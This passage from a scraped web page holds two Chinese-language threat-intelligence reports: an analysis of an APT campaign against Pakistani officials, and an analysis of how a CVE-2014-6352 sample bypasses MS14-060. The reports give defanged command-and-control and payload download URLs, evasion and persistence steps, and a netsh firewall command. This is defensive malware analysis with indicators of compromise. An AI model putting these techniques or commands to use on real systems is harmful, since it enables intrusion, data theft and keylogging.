data-line="159">其中AdminServerDll.dll是主要的功能模块，其每一个导出函数对应一个功能，可以从导出函数名知道其功能，如下：</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>导出函数</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EHCheckDownloadedFilesInDownloadFolderAreCompleteForModuleFile</td>\n<td>检查组件是否完整</td>\n</tr>\n<tr>\n<td>EHCheckFolderRecursive</td>\n<td>遍历文件目录</td>\n</tr>\n<tr>\n<td>EHCopyDirectory</td>\n<td>拷贝目录</td>\n</tr>\n<tr>\n<td>EHCountFilesInFolder</td>\n<td>遍历目录下面文件数</td>\n</tr>\n<tr>\n<td>EHCreateCompleteDirectoryStructure</td>\n<td>创建前面提到的Log、Sys等全部目录</td>\n</tr>\n<tr>\n<td>EHCreateDirectoryStructureFolderPath</td>\n<td>创建前面提到的Log、Sys中的指定目录</td>\n</tr>\n<tr>\n<td>EHCreateFileListForFolder</td>\n<td>获取目录文件列表</td>\n</tr>\n<tr>\n<td>EHCreateFolderHerarchyOnServer</td>\n<td>在服务端创建对应主机的目录</td>\n</tr>\n<tr>\n<td>EHCreateFolderHerarchyOnServerNeo</td>\n<td>在服务端创建对应主机的目录</td>\n</tr>\n<tr>\n<td>EHCreateFolderOnServerWithName</td>\n<td></td>\n</tr>\n<tr>\n<td>EHCreateFolderOnServerWithNameNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDeleteDirectory</td>\n<td>EHDeleteFilesInFolder</td>\n</tr>\n<tr>\n<td>EHDeleteListerUploaderFileOnServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDownLoadListerUploaderFileFromServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDownloadClientMachineGeoLocation</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDownloadDownloadFilesInDownloadFolderForModuleFile</td>\n<td>下载新模块</td>\n</tr>\n<tr>\n<td>EHExecuteDwonloadFilesInDownloadFolderForModuleFile</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExecuteFile</td>\n<td>执行指定文件</td>\n</tr>\n<tr>\n<td>EHExecuteFile_Parameters_With_Wait_To_Close</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExtractBinResource</td>\n<td></td>\n</tr>\n<tr>\n<td>EHExtractBufferFromFile</td>\n<td>读取指定文件的内容</td>\n</tr>\n<tr>\n<td>EHGetAeroModuleExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetDirectoryStructureFolderPath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetFileNameFromFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetFilePathFromFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetLastWriteTime</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetListerUploaderExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetListerUploaderStateFromServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetModuleFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetOnlineModuleFile</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetThisFinalRealeaseORNot</td>\n<td></td>\n</tr>\n<tr>\n<td>EHGetWinExePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsAeroFilesNeededServerState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsDots</td>\n<td></td>\n</tr>\n<tr>\n<td>EHIsInternetDataFilesNeededSeverState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHMyFileSeek</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPathFileExists</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPerformMainAllFunctionsOfApplication</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPerformOnLineModuleFunctions</td>\n<td></td>\n</tr>\n<tr>\n<td>EHPutLogMessage</td>\n<td></td>\n</tr>\n<tr>\n<td>EHScreenShotGrabberCreateAndGetNewScrnShotFolderNeo</td>\n<td style="\'color:red\'">上传屏幕截图</td>\n</tr>\n<tr>\n<td>EHScreenShotGrabberGetConfigDataNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetAeroFilesServerStateFalse</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetAeroModuleExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetInternetDataFilesServerStateFalse</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetListerUploaderExeState</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetLogFilePath</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetValueForEHApplicationServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHSetValueForEHApplicationServerNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHTerminateThisProcess</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFileKeyLogArchiveNeo</td>\n<td>上传键盘记录</td>\n</tr>\n<tr>\n<td>EHUploadFileMainUpload</td>\n<td>上传文件</td>\n</tr>\n<tr>\n<td>EHUploadFileRemoveableDrive</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFolderRecursive</td>\n<td></td>\n</tr>\n<tr>\n<td>EHUploadFolderRecursiveNeo</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</center>\n<ol start="2">\n<li>通信控制：</li>\n</ol>\n<p class="line" data-line="223">受控端通过HTTP请求与控制服务器通信，通过访问不同的php页面与控制端交互：</p>\n<p class="text-center line" data-line="225"><img src="/uploads/2017/07/25/be35f96995c2353ac8b23f6798f7262d.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="227"><img src="/uploads/2017/07/25/11104c88181d21537583d5b3a4131c87.png" alt="" width="90%"></p>\n<p class="line" data-line="229">经过整理后的路径如下：</p>\n<ul>\n<li>/EHGetScrnShotConfig.php</li>\n<li>/getAllFiles.php</li>\n<li>/getExecutables.php</li>\n<li>/getExtensions_doc.php</li>\n<li>/getExtensions_nondoc.php</li>\n<li>/getExtensions_rmdrive.php</li>\n<li>/EHCreateUploadFolder.php</li>\n<li>/EHOnlineModuleOperations.php</li>\n<li>/EHListerFunction.php</li>\n<li>/EHAeroFunction.php</li>\n<li>/EHAeroFunctionFalse.php</li>\n<li>/EHDeleteListerFile.php</li>\n<li>/EHFolderWithName.php</li>\n<li>/EHDelFolderWithName.php</li>\n<li>/EHInternetDataFiles.php</li>\n<li>/EHInternetDataFilesFalse.php</li>\n<li>/EHCreateAndGetScrnShotFolder.php</li>\n<li>/EHMainUpload.php</li>\n<li>/EHMergeAndMoveMainUpload.php</li>\n<li>/EHRemoveableDriveUpload.php</li>\n<li>/EHMergeAndMoveRemoveableDrive.php</li>\n<li>/EHFileFolderUpload.php</li>\n<li>/EHMergeAndMoveFileFolder.php</li>\n<li>/EHUploadKeylogArchive.php</li>\n<li>/DO_NOT_NEED_A_URI</li>\n</ul>\n<ol start="3">\n<li>检查VM、沙箱和调试</li>\n</ol>\n<p class="line" data-line="260">通过特权指令检查Virtual PC和VMWare：</p>\n<p class="text-center line" data-line="262"><img src="/uploads/2017/07/25/e88dbcd4397243b4c906fd7cc81112fa.png" alt=""><img src="/uploads/2017/07/25/e781dc98e41e276d67641c5366295297.png" alt=""></p>\n<p class="line" data-line="264">通过dll来识别Sandboxie和是否调试：</p>\n<p class="text-center line" data-line="266"><img src="/uploads/2017/07/25/f23cdac98d216499b5359c50fba73440.png" alt="" width="90%"></p>\n<h2 class="line" data-line="268">扩展与关联分析</h2>\n<p class="line" data-line="270">使用<a href="http://ti.360.com">360威胁情报中心的威胁情报平台</a>对样本连接的C&amp;C地址（185.109.144.102）做进一步关联，我们发现了更多的信息。</p>\n<p class="text-center line" data-line="272"><img src="/uploads/2017/07/25/959432cad2c5d6d40d259d62dc7d703e.png" alt="" width="90%"></p>\n<p class="line" data-line="274">其中有几个样本引起了我们的注意：</p>\n<ol>\n<li>MD5：a6c7d68c6593b9dd2e9b42f08942a8b0，文件名：isi_report_of_2016.rar</li>\n</ol>\n<p class="line" data-line="278">这个样本是一个邮件附件，解压后为Name of Facilitators revealed.scr，这个其实是一个sfx自解压文件，点击后会将explorerss.pub改名为explorerss.exe，注册启动项并执行，然后打开Pakistan army officers cover blown.pdf迷惑受害人。</p>\n<p class="text-center line" data-line="280"><img src="/uploads/2017/07/25/983b177cf4eedac5772b63213ab843b5.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="282"><img src="/uploads/2017/07/25/c61fb927553f2aec1f0c137547934645.png" alt="" width="90%"></p>\n<p class="line" data-line="284">而explorerss.exe是由python打包成exe的，功能是窃取指定文件内容并上传到hxxps:// 185[.]109[.]144[.]102/browse.php?folder=%s&amp;%s中。将其中的python代码还原后，部分代码如下：</p>\n<p class="text-center line" data-line="286"><img src="/uploads/2017/07/25/fa19545206958eab8471323406fb797b.png" alt="" width="90%"></p>\n<ol start="2">\n<li>MD5：872e7043ee8490db6e455942642c2c86 文件名：Current vacancies.doc</li>\n</ol>\n<p class="line" data-line="290">这个样本利用CVE-2012-0158释放一个downloader，downloader会下载执行hxxp://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe，之后的流程就和前面分析的一样，就不再多说了，值得注意的是文档的内容。显示为联合国招聘文件，这明显是对安全相关人员投递的邮件，有明显的政治动机：</p>\n<p class="text-center line" data-line="292"><img src="/uploads/2017/07/25/67d581ac06304a980c4b44ce451ef6ac.png" alt="cid:image001.png@01D2E5D2.5FAAFD20" width="90%"></p>\n<ol>\n<li>MD5: 1b41454bc0ff4ee428c0b49e614ef56c文件名：Ramadan Mubaraq.rtf</li>\n</ol>\n<p class="line" data-line="296">这个样本所利用的漏洞为CVE-2017-0199，olelink的地址为http://138[.]197[.]129[.]94/logo.doc</p>\n<p class="text-center line" data-line="298"><img src="/uploads/2017/07/25/44203dd80cb70f50f8040855f2d8bab2.png" alt="" width="90%"></p>\n<p class="line" data-line="300">从以上的分析和其他关联到的样本中，我们注意到一些有趣的事情：这些样本应该都是通过邮件附件的形式传递的，并且使用Office Nday漏洞或者社工手段引诱目标点开；从文件名、文档内容来看，都是对政治领域的相关人员进行的钓鱼邮件投递。综合多个样本的来源信息，这很有可能是一起针对巴基斯坦政府人员的定向攻击事件。</p>\n<h2 class="line" data-line="302">IOC</h2>\n<table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Current vacancies.doc</td>\n</tr>\n<tr>\n<td>peace-along-the-border-is-not-a-one-process-says-Lt-gen-ds-hooda.doc</td>\n</tr>\n<tr>\n<td>Name of Facilitators revealed.scr</td>\n</tr>\n<tr>\n<td>isi_report_of_2016.rar</td>\n</tr>\n<tr>\n<td>Pakistan army officers cover blown.pdf</td>\n</tr>\n<tr>\n<td>Ramadan Mubaraq.rtf</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>MD5</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>154ee0c3bb8250cae00d5ed0e6f894b4</td>\n</tr>\n<tr>\n<td>4f4cc89905bea999642a40d0590bdfa3</td>\n</tr>\n<tr>\n<td>6d7ef5c67604d62e63aa06c4a7832dac</td>\n</tr>\n<tr>\n<td>842e125beca97c185b33235e54e77d3a</td>\n</tr>\n<tr>\n<td>9cddfd8fa9dc98149e63f08f02a179cf</td>\n</tr>\n<tr>\n<td>c2be017b2fb3ad6f0f1c05ef10573b90</td>\n</tr>\n<tr>\n<td>c43bab60cbf7922a35979e4f41f9aa9e</td>\n</tr>\n<tr>\n<td>c5f76015b2cb15f59070d2e5cfdd8f6e</td>\n</tr>\n<tr>\n<td>cbd2340e37b2ae9fc85908affbb786a7</td>\n</tr>\n<tr>\n<td>d0dd1c70581606aa2a4926c5df4a32ee</td>\n</tr>\n<tr>\n<td>1b41454bc0ff4ee428c0b49e614ef56c</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>PDB</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\DefenderReference.pdb</td>\n</tr>\n<tr>\n<td>D:\\EH_DEVELOPMENT_SVN\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\EsstnalUpdte.pdb</td>\n</tr>\n<tr>\n<td>D:\\EH_DEVELOPMENT_SVN\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\ProcNeo.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\AdminNewDll.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\AdminServerDll.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\MSOBuild.pdb</td>\n</tr>\n<tr>\n<td>C:\\Users\\Fire\\Documents\\Visual Studio 2015\\Projects\\newfiles sent\\newfiles\\obj\\Release\\Pro-Gaurd.pdb</td>\n</tr>\n<tr>\n<td>E:\\EHDevelopmentSolution3\\EHDevelopmentSolution3\\Release\\WelcomeScrn.pdb</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>C&amp;C</strong></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>185.109.144.102:80</td>\n<td>hxxp://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe</td>\n</tr>\n<tr>\n<td></td>\n<td>hxxp://185[.]109[.]144[.]102/DO_NOT_NEED_A_URI</td>\n</tr>\n<tr>\n<td>185.109.144.102:443</td>\n<td>Tcp</td>\n</tr>\n<tr>\n<td>tes.sessions4life.pw</td>\n<td>hxxp://tes[.]sessions4life[.]pw/quiz/WelcomeScrn.exe</td>\n</tr>\n<tr>\n<td>138.197.129.94:80</td>\n<td>hxxp://138[.]197[.]129[.]94/logo.doc</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>Mutex</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EHWinHTTPWebServiceCall_MUTEX</td>\n</tr>\n<tr>\n<td>EHGetListerUploaderExeStateNeo_MUTEX</td>\n</tr>\n</tbody>\n</table>\n',category:"专题报告",__v:1,abstract:"2017年6月， 360威胁情报中心发现了一份可疑的利用漏洞执行恶意代码的Word文档，经过分析后，我们发现这有可能是一起针对巴基斯坦的政府官员的APT攻击事件，释放出来的载荷会收集受害者的键盘记录和重要软件密码、文档等。本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。",modify_time:"2017-08-01T08:24:07.172Z",readableId:"pakistan-targeted-apt-campaign",publish_time:"2016-06-23T18:05:05.000Z",descImg:"/uploads/2017/08/01/e3c37af797ae3d864e14f3e178ef86d5.png",insert_time:"2017-07-25T12:03:51.356Z",isDraft:!1,tags:["APT","Pakistan"]},{_id:"596f0ad74337d4596e59ed0b",title:"CVE-2014-6352漏洞及定向攻击样本分析",content:'<h2 class="line" data-line="0">引子</h2>\n<p class="line" data-line="3">人在做，天在看。</p>\n<p class="line" data-line="5">近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。</p>\n<p class="line" data-line="7">本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。</p>\n<h2 class="line" data-line="9">漏洞分析</h2>\n<p class="line" data-line="12">样本利用的漏洞为CVE-2014-6352，该漏洞是CVE-2014-4114的补丁绕过（MS14-060）问题,在管理员模式或者关闭UAC的情况下可以实现不弹出警告窗运行嵌入的恶意程序。与CVE-2014-4114的利用样本相比，CVE-2014-6352样本的特点是没有嵌入inf，只有一个嵌入PE的OLE对象。从攻击者的角度看，这类样本可以说有利有弊。在管理员模式下，可以无警告窗执行PE文件，绕开MS14-060的补丁。但是如果不是在管理员模式下，就算受害者没有安装MS14-060的补丁，也会弹窗提示是否要执行嵌入的EXE文件。</p>\n<p class="line" data-line="14">我们知道CVE-2014-4114漏洞的成因在于<code>packager.dll</code>的<code>CPackage::Load</code>方法加载对应的OLE复合文档对象时，对不同类型的复合文档有不同的处理流程，其中对某些复合文档嵌入的不可信来源文件没有经过处理，从而使得攻击者可以通过伪造OLE复合文档的CLSID来达到执行特定文件的效果：</p>\n<p class="text-center line" data-line="16"><img src="/uploads/2017/07/19/f897205ebdd4b539662fd55a38f8764c.png" alt="ec5689a025ca576871fd17473bcbc8c8" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="18"><code>packager!Cpackage:: Load</code>方法中处理不同类型复合文档的分支</p>\n<p class="line" data-line="20">在MS14-060这个补丁中，微软通过添加MarkFileUnsafe函数来弥补这个漏洞：</p>\n<p class="text-center line" data-line="22"><img src="/uploads/2017/07/19/f8526ca329f4febc58d84379d2e857a3.png" alt="17ff0c4e99eedd776dc74c83cd72c86e" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="25">ms14-060补丁中的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="text-center line" data-line="27"><img src="/uploads/2017/07/19/500690b9394d10953d84afcfcccecf5c.png" alt="ee2bf9b4ccab377f39d334ff2b4dd703" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="30">未安装ms14-060的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="line" data-line="32"><code>MarkFileUnsafe()</code>通过调用<code>IZoneIdentifier::SetId</code>来设置文件的Security Zone，传入的参数3对应的是设置URLZONE_INTERNET，从而标明此文件来自于其他计算机，运行时会弹出警告窗口：</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/19/8f9bade0d68af67a30677e2402f505b1.png" alt="de9349df8bd2c409db5fb768a4e43517" width="70%"></p>\n<p class="text-center line" data-line="36"><img src="/uploads/2017/07/19/f7ac3d0d95fc8757994bc71f1d7b1aa8.png" alt="3849abadc8fa5c51f32251ef06cdfb55" width="55%"></p>\n<p class="line" data-line="38">然而漏洞并不仅仅只是未对不可信来源的文件处理，攻击者还可以通过伪造OLE复合文档的CLSID和XML中的OLE Verb来改变执行流程。问题还在于对一个exe文件来说，即使被标记了URLZONE_INTERNET之后，右键点击以管理员权限运行时，将不会再弹窗提示该文件来自于其他计算机，而是以UAC的提示窗弹出：</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/19/8e41d3b4d060bdc985a952f701f3338f.png" alt="88ced94789ce38c0e55e572dc208d252" width="60%"></p>\n<p class="line" data-line="42">所以只需要构造特定的CLSID和OLE Verb，使执行流程来到右键界面的第二项管理员权限运行EXE程序，那么在关闭UAC或者管理员权限的情况下，就能绕过MS14-060补丁施加的限制。下面我们结合这次从外面捕获到的样本来展示一下整个漏洞利用的过程。</p>\n<h2 class="line" data-line="44">样本分析</h2>\n<p class="line" data-line="47">首先我们拿到了一个名为vedio.ppsx的PPT文件，MD5为<strong>b6a1ee16de885c70682a7a8e4c1b556c</strong>，从VirusTotal的上传来源看为来自印度。对这个ppsx解压处理，可以看到其内嵌了一个OLE对象，嵌入的是一个PE文件：</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/19/8530294cce4221c3b4b01073411f8feb.png" alt="da510314acac1a35878ca8c501550066" width="70%"></p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/19/71277408e68d7ff10d9133df8c53121b.png" alt="7a789920319ebd01a8111191b8436d07" width="70%"></p>\n<p class="line" data-line="54">在video.ppsx\\ppt\\slides\\slide1.xml中，指定了嵌入的对象<em>id = rId3</em></p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/19/0dad7c0e72148d4bcf5696155bd56afe.png" alt="dd45f53f870504f4cb90c4aeb3216967" width="90%"></p>\n<p class="line" data-line="59">在video.ppsx \\ppt\\slides\\_rels\\ slide1.xml.rels中指定了rId3对应的是前面提到的oleObject1.bin</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/19/70bba37c63f251a821b6d85c0b99f089.png" alt="25e8be6c73bc79e942c20ca4ec47d751" width="90%"></p>\n<p class="line" data-line="64">复合文档对应的CLSID如下图，是{0003000c-0000-0000-c000-000000000046}，对应的是<code>CLSID\\_OldPackage</code>，那么根据上面的分析，<code>CPackage::Load</code>调用<code>CPackage::PackageReadFromStream</code>进一步处理，<code>PackageReadFromStream</code>会通过<code>CPackage::EmbedReadFromStream</code>在临时目录释放嵌入的PE文件。</p>\n<p class="text-center line" data-line="66"><img src="/uploads/2017/07/19/3b26fb904b5198daf95db220515432fc.png" alt="bd02c7199b8937e755285c7a94319bab" width="70%"></p>\n<p class="line" data-line="69"><code>packager!CPackage::EmbedReadFromStream</code>中调用了 <code>packager!CopyStreamToFile</code>这个函数，将嵌入的PE释放到temp目录下的putty.exe，并通过MarkFileUnsafe设置文件标记：</p>\n<p class="text-center line" data-line="71"><img src="/uploads/2017/07/19/4d8325c9f5d207023f8dc61d8b3d6084.png" alt="5aa0635ef7f3180fe1db46f7399917fc" width="70%"></p>\n<p class="line" data-line="74">然后，通过<code>CPackage::DoVerb</code>方法来响应终端用户的动作，在 <code>CPackage::DoVerb</code>中，会先对第二个参数进行判断，这个参数在video.ppsx\\ppt\\slides\\slide1.xml中指定：</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/19/6185b2931696c6e14f0fcb33ed723bdc.png" alt="110e72f2b2d8cc8fb61b1b03d434272b" width="60%"></p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/19/974285891fde33c617e3bf0491c2c9e4.png" alt="84a19910d81ea7d7e44d3b4b02528135" width="50%"></p>\n<p class="line" data-line="80">样本中构造的参数是3，所以进入使用popup菜单命令执行操作的流程：</p>\n<p class="text-center line" data-line="82"><img src="/uploads/2017/07/19/53028b83a41a36a4db703f8136d7728c.png" alt="40cec50bbd6ae2f8051496495b28f10c" width="70%"></p>\n<p class="line" data-line="85">调用GetMenuItemInfo时，第二个参数uItem代表菜单的位置，这里参数为1，也就是右键菜单的第二项，对于exe文件，右键菜单的第二项是“以管理员权限运行”</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/19/0839a8cf4c88abab33f22ceefcd087b9.png" alt="c63035508e86f51a92ba30eb4923487d" width="70%"></p>\n<p class="line" data-line="90">最终调用了<code>SHELL32!CDefFolderMenu::InvokeCommand</code>方法，这时就会以试图管理员权限运行putty.exe，在关闭了UAC或者管理员模式下，就绕过了MS14-060的保护静默地执行了一个PE文件。</p>\n<h2 class="line" data-line="92">所释放程序的分析</h2>\n<h3 class="line" data-line="95">putty.exe</h3>\n<p class="line" data-line="97">ppt文件释放出来的putty.exe实际上是一个改名后的经过混淆的.NET 程序，MD5为 <strong>78fab9978ae4de4f684908f47fdc2333</strong>，这个程序其实是一个Dropper。</p>\n<p class="line" data-line="99">经过去混淆后，我们可以清楚地看到其程序代码，首先遍历是否有杀软进程：</p>\n<p class="text-center line" data-line="101"><img src="/uploads/2017/07/19/b1424f26361cd612bea23097ac9ebdd5.png" alt="6288c40a99e15e50f60403cd645fdf7b" width="70%"></p>\n<p class="line" data-line="104">样本在这里其实不是一次遍历查找，而是分成多次遍历穿插在功能代码中，每次查找一到两款杀软的进程，查找的杀软进程如下：</p>\n<ul>\n<li>ekrn.exe（ESET）</li>\n<li>guardxkickoff.exe（IKARUS）</li>\n<li>AvastSvc.exe</li>\n<li>btagent.exe</li>\n<li>bdagent.exe（BitDefender）</li>\n<li>avgui.exe。</li>\n</ul>\n<p class="line" data-line="113">然后从资源中读取数据，并解密为一个PE文件</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/19/8d14516bf5fda74c4fda4048d187393a.png" alt="fd4d12799d8a7d3ba57780053606e0e0" width="70%"></p>\n<p class="line" data-line="118">启动cmd进程，将自身拷贝成%temp%\\net\\health.exe并添加注册表启动项</p>\n<p class="text-center line" data-line="120"><img src="/uploads/2017/07/19/e2c5fbd89afc5af31fd936983addb09f.png" alt="d755d300218b7dddee8b99a2b22a18ca" width="90%"></p>\n<p class="text-center line" data-line="122"><img src="/uploads/2017/07/19/6406e44c2341468d55b1008d4a45c344.png" alt="25119ad65db1a5d422c56f97cf33fdbb" width="90%"></p>\n<p class="line" data-line="125"><strong>HKEY_CURRENT_USER/Software/Microsoft/Windows NT/CurrentVersion/Windows - load</strong> 这个值可以指定在用户登录后自动运行的程序文件名。</p>\n<p class="line" data-line="127">然后将RegAsm.exe拷贝为%temp%\\svhost.exe</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/19/045a76172ad87b67fb6d983d27bca8aa.png" alt="ed46672de8d53ce473fa7954a269da27" width="40%"></p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/19/fa85671b4f2d25b42a835941e8b1b314.png" alt="9b6440545c9cbff8e32d59cf008fe4b7" width="90%"></p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/19/07c64ae2210d205282d9996758959d27.png" alt="1d3d631a1227c51f472b44367128ab08" width="60%"></p>\n<p class="line" data-line="135">接着以Suspend方式启动svhost.exe，将之前解密出来的PE注入，并恢复线程。</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/19/ba0c7e440408f7d03148d03e952bfeab.png" alt="7f38dd2a4d4f4cdd659319f1af2c5e62" width="90%"></p>\n<p class="line" data-line="139">最后在%temp%/net/目录下写入health.exe.bat文件并执行</p>\n<p class="text-center line" data-line="141"><img src="/uploads/2017/07/19/5c48658f739e268d990f44b2b8c62f60.png" alt="835aae11f4e76320611b52eb98d3d1d2" width="80%"></p>\n<p class="line" data-line="143">health.exe.bat的代码如下，作用是不断遍历进程查看svhost.exe是否启动，没有启动的话则将其启动。</p>\n<p class="text-center line" data-line="145"><img src="/uploads/2017/07/19/26b6d8ff104be4f22a048131f4d481cd.png" alt="7da28826361240a37f148a685e5ab563" width="80%"></p>\n<h3 class="line" data-line="147">svhost.exe</h3>\n<p class="line" data-line="149">在HKEY_CURRENT_USER中设置一个值di用于判断是否已经感染过该系统：</p>\n<p class="text-center line" data-line="151"><img src="/uploads/2017/07/19/addb5d89a982f492bf7b89a19ad98a82.png" alt="c95ebff2497c18d2b3bb4b9710c9049d" width="70%"></p>\n<p class="line" data-line="153">设置HKEY_CURRENT_USER\\Environment\\SEE_MASK_NOZONECHECKS的值为1，这是用于关闭附件管理器检查的：</p>\n<p class="text-center line" data-line="155"><img src="/uploads/2017/07/19/5b53e06d0749114811dc105474a0b25b.png" alt="7ddf63a334a55426403ccf7796ed9ac4" width="90%"></p>\n<p class="line" data-line="157">然后用命令行启动netsh.exe，添加防火墙规则，允许其通过防火墙</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/19/a24b4030f205e25bd7786d5c801195c7.png" alt="11cf4fcbdcc9843135ccf3501f432f78" width="70%"></p>\n<p class="line" data-line="161">命令行如下</p>\n<pre class="hljs"><code class="hljs">netsh firewall add allowedprogram "C:\\\\Users\\\\\\*\\*\\*\\\\AppData\\\\Local\\\\Temp\\\\svhost.exe" " svhost.exe" ENABLE\n</code></pre>\n<p class="line" data-line="166">申请一片内存空间用于存放接收/发送的数据，开始网络连接：</p>\n<p class="text-center line" data-line="168"><img src="/uploads/2017/07/19/9676a58a7a0286760d7efe01716f8b8d.png" alt="2b352c13dc65a30c5a89e3e58b7e5cd1" width="85%"></p>\n<p class="line" data-line="170">C&amp;C地址： 191.101.23.190</p>\n<p class="text-center line" data-line="172"><img src="/uploads/2017/07/19/7af893eca785ff862aee5afbac77b95b.png" alt="d0e210eb3f1849905b921d248fec11dd" width="45%"></p>\n<p class="line" data-line="174">端口号： 5552</p>\n<p class="text-center line" data-line="176"><img src="/uploads/2017/07/19/9bc5294feb1eba985a19966856852ebd.png" alt="3ee54e4519c9871e67dc2e902f0f5158" width="45%"></p>\n<p class="line" data-line="178">收集受害者的系统信息，包括上线时间、系统版本、系统位数、磁盘信息、当前用户等等，并发送出去：</p>\n<p class="text-center line" data-line="180"><img src="/uploads/2017/07/19/6d0d740ce86a5be474a38e095a07958b.png" alt="b34f35ad7c8977ff9ef8112311810416" width="90%"></p>\n<p class="line" data-line="182">然后开启一个线程循环查询socket是否可读（接收命令）：</p>\n<p class="text-center line" data-line="184"><img src="/uploads/2017/07/19/6f86f185399a40ecfcaafc97da288f3d.png" alt="64a74da6585d5361b5e420fd66de70a5" width="70%"></p>\n<p class="line" data-line="186">读取命令后，开启新线程根据指令执行对应的操作：</p>\n<p class="text-center line" data-line="188"><img src="/uploads/2017/07/19/425702e46d852ad1355b76207ab5f7fb.png" alt="6a52e6ba30f4ef0bce214db10ae90dae" width="90%"></p>\n<p class="line" data-line="190">开启键盘记录线程，并将记录信息保存在注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中：</p>\n<p class="text-center line" data-line="192"><img src="/uploads/2017/07/19/b40472dad950a9b67f100bbfdace23fe.png" alt="a717d59135d644202bedebcc6412c553" width="90%"></p>\n<p class="text-center line" data-line="194"><img src="/uploads/2017/07/19/500e126afffb6afb4d141341145f9512.png" alt="80b41258aea92eb0ca1b83e446a900bf" width="90%"></p>\n<p class="line" data-line="196">设置自启动项：</p>\n<p class="text-center line" data-line="198"><img src="/uploads/2017/07/19/109deec3d382e38db502a2043da04b0c.png" alt="65ff19f29e11e13e3178dcf40a1416fb" width="90%"></p>\n<p class="text-center line" data-line="201"><img src="/uploads/2017/07/19/7fbf79d02308fa3ea4b0b3868cefcf89.png" alt="601e1a90b302e8c0c9989aafe7f95cb4" width="90%"></p>\n<p 